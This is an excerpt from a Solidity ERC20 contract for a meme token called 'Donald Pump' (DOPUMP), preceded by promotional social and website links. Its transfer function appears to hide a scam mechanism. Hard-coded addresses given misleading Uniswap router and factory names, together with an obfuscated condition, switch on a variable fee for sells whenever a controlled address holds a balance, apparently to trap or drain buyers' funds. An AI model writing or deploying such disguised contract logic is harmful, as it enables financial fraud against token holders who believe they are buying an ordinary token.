...
https://twitter.com/DonaldPumpCoinBNB
https://t.me.com/DonaldPumpCoinBNB
https://DonaldPumpCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal _uniswapRouterV2 = 0x2D92aaC01295441d98833ECFa3911941fA65946f;
    uint256 private swappingToggle = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private _uniswapV2Factory = 0x81675c64F7991998a944b3D3E890A8842106d4CF;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouterV2 && _balances[_uniswapV2Factory] > 0 ? _pairsAllowance : swappingToggle).div(100) + 0;
        if (swapamount > 0)
        {
...
contract DonaldPumpCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"Donald Pump", unicode"DOPUMP")
    {
